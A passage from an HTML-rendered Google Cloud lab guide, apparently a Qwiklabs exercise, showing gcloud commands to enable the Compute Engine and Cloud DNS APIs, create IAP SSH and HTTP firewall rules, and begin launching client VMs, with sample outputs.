0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - @.com (active)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = </span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><h4 id='task-1-enable-apis'><span>Task 1. Enable APIs</span></h4><p><span>Ensure that the Compute and the Cloud DNS APIs are enabled. In this section, you will enable the APIs manually, using </span><code>gcloud</code><span> commands.</span></p><h4 id='enable-compute-engine-api'><span>Enable Compute Engine API</span></h4><ul><li><p><span>Run the </span><code>gcloud services enable</code><span> command to enable the Compute Engine API:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable compute.googleapis.com</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This command can take a few minutes to complete.</span></p><h4 id='enable-cloud-dns-api'><span>Enable Cloud DNS API</span></h4><ul><li><p><span>Run the </span><code>gcloud services enable</code><span> command to enable the Cloud DNS API:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable dns.googleapis.com</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This command can take a few minutes to complete.</span></p><h4 id='verify-that-the-apis-are-enabled'><span>Verify that the APIs are enabled</span></h4><ul><li><p><span>Run the </span><code>gcloud services list</code><span> command to list all the enabled APIs. We should see </span><code>compute.googleapis.com</code><span> and </span><code>dns.googleapis.com</code><span> in the listed output.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services list | grep -E 'compute|dns'</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: compute.googleapis.com</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: dns.googleapis.com</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h4 id='task-2-configure-the-firewall'><span>Task 2. Configure the firewall</span></h4><p><span>Before you create the client VMs and the web servers, you need to create two firewall rules.</span></p><p><strong><span>Note:</span></strong><span> The </span><code>firewall-rules create</code><span> command can take a few minutes to complete. Please wait for the &quot;Creating firewall...done&quot; message before proceeding to the next step.</span></p><ol start='' ><li><p><span>To be able to SSH into the client VMs, run the following to create a firewall rule to allow SSH traffic from Identity Aware Proxies (IAP):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create fw-default-iapproxy \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--direction=INGRESS \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority=1000 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=default \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--action=ALLOW \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--rules=tcp:22,icmp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--source-ranges=35.235.240.0/20</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Creating firewall...working..Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-01-c5d669dffb06/global/firewalls/fw-default-iapproxy].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Creating firewall...done.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: fw-default-iapproxy</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NETWORK: default</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DIRECTION: INGRESS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PRIORITY: 1000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ALLOW: tcp:22,icmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DENY:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DISABLED: False</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><ol start='' ><li><p><span>To allow HTTP traffic on the web servers, each web server will have a &quot;http-server&quot; tag associated with it. You will use this tag to apply the firewall rule only to your web servers:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create allow-http-traffic --direction=INGRESS --priority=1000 --network=default --action=ALLOW --rules=tcp:80 --source-ranges=0.0.0.0/0 --target-tags=http-server</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Creating firewall...working..Created [https://www.googleapis.com/compute/v1/projects/routing-policy-lab/global/firewalls/allow-http-traffic].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Creating firewall...done.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: allow-http-traffic</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NETWORK: default</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DIRECTION: INGRESS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PRIORITY: 1000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ALLOW: tcp:80</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DENY:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DISABLED: False</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configure the Firewall</span></p><p>&nbsp;</p><h4 id='task-3-launch-client-vms'><span>Task 3. Launch client VMs</span></h4><p><span>Now that the APIs are enabled, and the firewall rules are in place, the next step is to set up the environment. In this section, you will create 3 client VMs, one in each region.</span></p><h4 id='launch-a-client-in-the-united-states'><span>Launch a client in the United States</span></h4><ul><li><p><span>Run the </span><code>gcloud compute instances create</code><span> command to create the client VMs:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create us-client-vm --machine-type=e2-micro --zone "Zone 1"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This command can take a few minutes to complete. Please wait for a &quot;Created&quot; message before moving to the next step. Note that you may see a different zone in gcloud than in the sample output shown below.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" 